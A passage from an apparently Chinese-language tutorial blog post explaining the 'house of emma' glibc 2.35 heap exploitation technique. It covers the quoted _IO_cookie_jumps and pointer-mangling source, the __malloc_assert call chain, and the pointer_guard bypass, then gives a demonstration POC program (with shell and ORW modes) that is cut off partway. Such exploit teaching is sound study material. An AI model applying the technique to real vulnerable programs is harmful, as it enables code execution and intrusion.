<h2 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h2><p>在 <code>vtable</code> 段中存在一个<code> _IO_cookie_jumps</code>：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> _IO_cookie_jumps libio_vtable = &#123;</span><br><span class="line">	JUMP_INIT_DUMMY,</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(finish, _IO_file_finish),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(overflow, _IO_file_overflow),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(underflow, _IO_file_underflow),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(uflow, _IO_default_uflow),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(pbackfail, _IO_default_pbackfail),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(xsputn, _IO_file_xsputn),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(xsgetn, _IO_default_xsgetn),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(seekoff, _IO_cookie_seekoff),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(seekpos, _IO_default_seekpos),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(setbuf, _IO_file_setbuf),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(sync, _IO_file_sync),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(doallocate, _IO_file_doallocate),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(read, _IO_cookie_read),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(write, _IO_cookie_write),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(seek, _IO_cookie_seek),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(close, _IO_cookie_close),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(stat, _IO_default_stat),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(showmanyc, _IO_default_showmanyc),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(imbue, _IO_default_imbue),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><code>_IO_cookie_file</code> 有如下定义：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Special file type for fopencookie function.  */</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_cookie_file</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_FILE_plus</span> __fp;</span><br><span class="line">  <span class="type">void</span> *__cookie;</span><br><span class="line">  <span class="type">cookie_io_functions_t</span> __io_functions;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IO_cookie_io_functions_t</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read;        <span class="comment">/* Read bytes.  */</span></span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write;    <span class="comment">/* Write bytes.  */</span></span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek;        <span class="comment">/* Seek/tell file position.  */</span></span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close;    <span class="comment">/* Close file.  */</span></span><br><span class="line">&#125; <span class="type">cookie_io_functions_t</span>;</span><br></pre></td></tr></table></figure></div>

<p>其中的函数定义如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> _IO_ssize_t</span><br><span class="line">_IO_cookie_read (_IO_FILE *fp, <span class="type">void</span> *buf, _IO_ssize_t size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_cookie_file</span> *cfile = (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read_cb = cfile-&gt;__io_functions.read;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="built_in">PTR_DEMANGLE</span> (read_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (read_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read_cb</span> (cfile-&gt;__cookie, buf, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> _IO_ssize_t</span><br><span class="line">_IO_cookie_write (_IO_FILE *fp, <span class="type">const</span> <span class="type">void</span> *buf, _IO_ssize_t size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_cookie_file</span> *cfile = (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write_cb = cfile-&gt;__io_functions.write;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="built_in">PTR_DEMANGLE</span> (write_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (write_cb == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_ssize_t n = <span class="built_in">write_cb</span> (cfile-&gt;__cookie, buf, size);</span><br><span class="line">  <span class="keyword">if</span> (n &lt; size)</span><br><span class="line">    fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> _IO_off64_t</span><br><span class="line">_IO_cookie_seek (_IO_FILE *fp, _IO_off64_t offset, <span class="type">int</span> dir)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_cookie_file</span> *cfile = (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek_cb = cfile-&gt;__io_functions.seek;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="built_in">PTR_DEMANGLE</span> (seek_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ((seek_cb == <span class="literal">NULL</span></span><br><span class="line">	   || (<span class="built_in">seek_cb</span> (cfile-&gt;__cookie, &amp;offset, dir)</span><br><span class="line">	       == <span class="number">-1</span>)</span><br><span class="line">	   || offset == (_IO_off64_t) <span class="number">-1</span>)</span><br><span class="line">	  ? _IO_pos_BAD : offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line">_IO_cookie_close (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_cookie_file</span> *cfile = (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close_cb = cfile-&gt;__io_functions.close;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="built_in">PTR_DEMANGLE</span> (close_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (close_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">close_cb</span> (cfile-&gt;__cookie);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到上面代码的函数调用前都被<code>PTR_DEMANGLE</code>加密了，其定义如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">uintptr_t</span> __pointer_chk_guard attribute_relro;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTR_MANGLE(var) \</span></span><br><span class="line"><span class="meta">  (var) = (__typeof (var)) ((uintptr_t) (var) ^ __pointer_chk_guard)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTR_DEMANGLE(var) PTR_MANGLE (var)</span></span><br></pre></td></tr></table></figure></div>

<p>这段宏定义的操作是将函数指针 <code>ROR</code> 循环右移 <code>11</code> 位然后与 <code>fs:[0x30]</code> 异或得到真正的函数地址。解密时首先异或 <code>pointer_guard</code>，然后循环左移 <code>0x11</code> 位。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//sysdeps/x86_64/nptl/tls.h</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">  <span class="type">void</span> *tcb;    <span class="comment">/* 指向TCB */</span></span><br><span class="line">  <span class="type">dtv_t</span> *dtv;       <span class="comment">/* 指向dtv数组 */</span></span><br><span class="line">  <span class="type">void</span> *self;   <span class="comment">/* 指向自身  */</span></span><br><span class="line">  <span class="type">int</span> multiple_threads;</span><br><span class="line">  <span class="type">int</span> gscope_flag;</span><br><span class="line">  <span class="type">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="type">uintptr_t</span> stack_guard;    <span class="comment">/* canary值 */</span></span><br><span class="line">  <span class="type">uintptr_t</span> pointer_guard;  <span class="comment">/* 用于保护指针 */</span></span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">&#125; <span class="type">tcbhead_t</span>;</span><br></pre></td></tr></table></figure></div>

<p><code>fs:[0x28]</code> 是 <code>tls</code> 上存储的 <code>canary</code>，根据 <code>tcbhead_t</code> 结构体的定义，<code>fs[0x30]</code> 是 <code>pointer_guard</code> ，用于对指针进行加密。我们可以先泄露堆地址和 <code>libc</code> 基地址，然后利用 <code>large bin attack</code> 在 <code>tls</code> 对应 <code>pointer_guard</code> 上写一个 <code>chunk</code> 地址，从而绕过指针保护。除此之外还需要让 <code>_lock</code>指向一块可写内存。</p>
<p><strong>调用链如下</strong>：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">		 <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">		     __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     file, line,</span><br><span class="line">		     function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     assertion);</span><br><span class="line">  <span class="built_in">fflush</span> (stderr);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line">__fxprintf (FILE *fp, <span class="type">const</span> <span class="type">char</span> *fmt, ...)</span><br><span class="line">&#123;</span><br><span class="line">  va_list ap;</span><br><span class="line">  <span class="built_in">va_start</span> (ap, fmt);</span><br><span class="line">  <span class="type">int</span> res = __vfxprintf (fp, fmt, ap, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">va_end</span> (ap);</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line">__vfxprintf (FILE *fp, <span class="type">const</span> <span class="type">char</span> *fmt, va_list ap,</span><br><span class="line">	     <span class="type">unsigned</span> <span class="type">int</span> mode_flags)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">    fp = stderr;</span><br><span class="line">  _IO_flockfile (fp);</span><br><span class="line">  <span class="type">int</span> res = <span class="built_in">locked_vfxprintf</span> (fp, fmt, ap, mode_flags);</span><br><span class="line">  _IO_funlockfile (fp);</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span></span></span><br><span class="line"><span class="function"><span class="title">locked_vfxprintf</span> <span class="params">(FILE *fp, <span class="type">const</span> <span class="type">char</span> *fmt, va_list ap,</span></span></span><br><span class="line"><span class="params"><span class="function">		  <span class="type">unsigned</span> <span class="type">int</span> mode_flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (_IO_fwide (fp, <span class="number">0</span>) &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> __vfprintf_internal (fp, fmt, ap, mode_flags);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> vfprintf	__vfprintf_internal</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span></span></span><br><span class="line"><span class="function"><span class="title">vfprintf</span> <span class="params">(FILE *s, <span class="type">const</span> CHAR_T *format, va_list ap, <span class="type">unsigned</span> <span class="type">int</span> mode_flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="built_in">outstring</span> ((<span class="type">const</span> UCHAR_T *) format,</span><br><span class="line">	     lead_str_end - (<span class="type">const</span> UCHAR_T *) format);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> outstring(String, Len)                          \</span></span><br><span class="line"><span class="meta">    do &#123;                                                \</span></span><br><span class="line"><span class="meta">        const void *string_ = (String);                 \</span></span><br><span class="line"><span class="meta">        done = outstring_func(s, string_, (Len), done); \</span></span><br><span class="line"><span class="meta">        <span class="keyword">if</span> (done &lt; 0)                                   \</span></span><br><span class="line"><span class="meta">            goto all_done;                              \</span></span><br><span class="line"><span class="meta">    &#125; while (0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PUT(F, S, N)	_IO_sputn ((F), (S), (N))  </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span></span></span><br><span class="line"><span class="function"><span class="title">outstring_func</span> <span class="params">(FILE *s, <span class="type">const</span> UCHAR_T *string, <span class="type">size_t</span> length, <span class="type">int</span> done)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">assert</span> ((<span class="type">size_t</span>) done &lt;= (<span class="type">size_t</span>) INT_MAX);</span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">size_t</span>) <span class="built_in">PUT</span> (s, string, length) != (<span class="type">size_t</span>) (length))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">done_add_func</span> (length, done);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>利用条件</strong>：</p>
<ul>
<li>或者可以进行任意地址写堆地址；</li>
<li>可以触发 <code>IO</code> 流操作。</li>
</ul>
<h2 id="POC-4"><a href="#POC-4" class="headerlink" title="POC"></a><a class="link"   href="https://blog.csdn.net/qq_54218833/article/details/126401517" >POC <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h2><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GETSHELL_MODE 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ORW_MODE 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// IMPORTANT! YOU CAN CHANGE THE MODE HERE</span></span><br><span class="line"><span class="type">int</span> mode = ORW_MODE;</span><br><span class="line"><span class="type">char</span>* sh = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"><span class="type">char</span>* flag = <span class="string">&quot;./flag&quot;</span>;</span><br><span class="line"><span class="type">size_t</span> space[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">setvbuf</span>(stdin,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line">    <span class="built_in">setvbuf</span>(stdout,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mHello! today let&#x27;s learn something about house of emma.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m本程序用于演示house of emma的漏洞利用原理。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[1;31mTested in Ubuntu 22.04, glibc version: Ubuntu GLIBC 2.35-0ubuntu3.1\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[1;31m测试环境：Ubuntu 22.04，glibc版本为2.35-0ubuntu3.1\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mHouse of emma is used for high version of glibc, it utilizes _IO_FILE struct to exploit.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mhouse of emma 适用于高版本glibc，它使用_IO_FILE结构体进行漏洞利用。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mSame as other way of exploitation with _IO_FILE, it also use fake _IO_FILE struct.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m与其他利用_IO_FILE结构体漏洞的方法相同，它也利用了伪造的_IO_FILE结构体。\n\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIt can be triggered by function __malloc_assert, so it always go with heap vulnerabilities.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m它可以通过函数__malloc_assert触发，因此它常常与堆漏洞相联系。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mFirst we need to know the structure of _IO_FILE in glibc 2.35:\033[0m&quot;</span></span><br><span class="line">         <span class="string">&quot;\033[32m首先我们需要了解一下glibc 2.35版本下_IO_FILE结构体的内容：\n\033[0m&quot;</span></span><br><span class="line">         <span class="string">&quot;\033[33m(line 49, /libio/bits/types/struct_FILE.h)\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34mstruct _IO_FILE\n&quot;</span></span><br><span class="line">         <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  int _flags;\t\t/* High-order word is _IO_MAGIC; rest is flags. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  /* The following pointers correspond to the C++ streambuf protocol. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char *_IO_read_ptr;\t/* Current read pointer */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char *_IO_read_end;\t/* End of get area. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char *_IO_read_base;\t/* Start of putback+get area. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char *_IO_write_base;\t/* Start of put area. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char *_IO_write_ptr;\t/* Current put pointer. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char *_IO_write_end;\t/* End of put area. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char *_IO_buf_base;\t/* Start of reserve area. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char *_IO_buf_end;\t/* End of reserve area. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  /* The following fields are used to support backing up and undo. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char *_IO_save_base; /* Pointer to start of non-current get area. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char *_IO_backup_base;  /* Pointer to first valid character of backup area */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char *_IO_save_end; /* Pointer to end of non-current get area. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  struct _IO_marker *_markers;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  struct _IO_FILE *_chain;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  int _fileno;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  int _flags2;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  __off_t _old_offset; /* This used to be _offset but it&#x27;s too small.  */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  /* 1+column number of pbase(); 0 is unknown. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  unsigned short _cur_column;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  signed char _vtable_offset;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char _shortbuf[1];\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  _IO_lock_t *_lock;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;#ifdef _IO_USE_OLD_IO_FILE\n&quot;</span></span><br><span class="line">         <span class="string">&quot;&#125;;\n\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe key element we need to forge is the *vtable pointer.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m其中的关键就是*vtable指针。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIt&#x27;s worth noticing that we need to write correct *_lock value in our fake _IO_FILE.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m值得注意的是，我们需要写入正确的*_lock指针值到伪造的_IO_FILE结构体中。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe value of *_lock should be \033[31m_IO_stdfile_1_lock.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m*_lock的值应该是\033[31m_IO_stdfile_1_lock.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mSo that we need to know the loading base address of libc.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m所以我们需要知道libc的加载基地址。\n\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[35mNow let&#x27;s get loading base address of libc through the address of function puts().\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[35m现在让我们通过puts()函数获取一下libc的加载基地址。\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">int</span>(*func)(<span class="type">const</span> <span class="type">char</span>*)  = puts;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe address of function puts() is: \033[31m%p\n\033[0m&quot;</span>, func);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mputs函数的地址为: \033[31m%p\n\033[0m&quot;</span>, func);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mSo that the loading address of libc is: \033[31m%p\n\033[0m&quot;</span>, func - <span class="number">0x80ed0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m因此libc的加载地址为: \033[31m%p\n\033[0m&quot;</span>, func - <span class="number">0x80ed0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[33m(The offset address of function puts() is 0x80ed0)\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[33m(puts函数的偏移量为0x80ed0)\n\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> libc_base = (<span class="type">size_t</span>)(func - <span class="number">0x80ed0</span>);</span><br><span class="line">    <span class="type">size_t</span> stderr_ptr = (<span class="type">size_t</span>)(libc_base + <span class="number">0x21a860</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mSince we know the libc base address, we can also know the address of pointer stderr: \033[31m%p\033[0m\n&quot;</span>, (<span class="type">void</span>*)stderr_ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m既然现在我们已经知道了libc的加载地址，我们也可以获得stderr指针的地址: \033[31m%p\033[0m\n&quot;</span>, (<span class="type">void</span>*)stderr_ptr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mNow let&#x27;s satisfy the second prerequisite of the exploit: \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m下面让我们构造一下这个漏洞利用的第二个前提条件: \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[33mGet the value of pointer_guard or change it to a known value.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[33m获取到pointer_guard的值并将其修改为一个已知值。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mOur house of emma has a stable call chain, and we&#x27;ll need the value to guide rip to the function we want.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m我们的house of emma利用方式有一条完整的函数调用链，我们需要这个pointer_guard的值来引导rip到我们想要的函数。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mWhere the value is used will be introduced later.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m我们之后将会介绍这个pointer_guard的地址在什么地方。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIt&#x27;s worth noticing that\033[31m the value of pointer guard is not located in libc, while before libc.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m需要注意的是pointer guard的值并不在libc中，而是在libc的低地址处。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIf you use pwndbg, you can see that before libc, there exists an anonymous space, with its size of 0x3000.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m如果使用pwndbg，你可以看到在libc前面有一个匿名的内存区域，大小为0x3000。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe tls struct is located in this anonymous area, which includes the value of pointer_guard.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mtls结构体就位于这个匿名的内存空间中，它包含有pointer_guard。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mTo be more detail, the value of pointer_guard is located in (libc_base - 0x3000 + 0x770)\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m更具体地说，pointer_guard的值应该位于(libc_base - 0x3000 + 0x770)\n\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mActually, the name of the struct is \033[31mtcbhead_t\033[32m. Here is the structure:\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m实际上，这个结构体的名字是\033[31mtcbhead_t\033[32m. 下面是它的构造:\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[33m(line 36, /sysdeps/x86_64/nptl/tls.h)\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span 